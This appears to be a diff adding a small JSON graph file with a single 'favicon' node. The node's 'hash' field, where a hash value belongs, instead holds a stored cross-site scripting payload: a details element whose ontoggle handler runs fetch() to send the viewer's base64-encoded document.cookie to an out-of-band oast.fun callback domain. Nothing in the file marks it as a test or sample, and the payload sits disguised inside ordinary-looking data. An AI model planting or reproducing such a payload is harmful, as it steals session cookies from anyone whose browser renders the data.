@@ -1,0 +1,11 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "favicon",
+      "hash": "<details open ontoggle=\"fetch('https://fav.'+btoa(document.cookie||'nocookie')+'.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun')\">",
+      "location": "/favicon.ico"
+    }
+  ],
+  "edges": []
+}
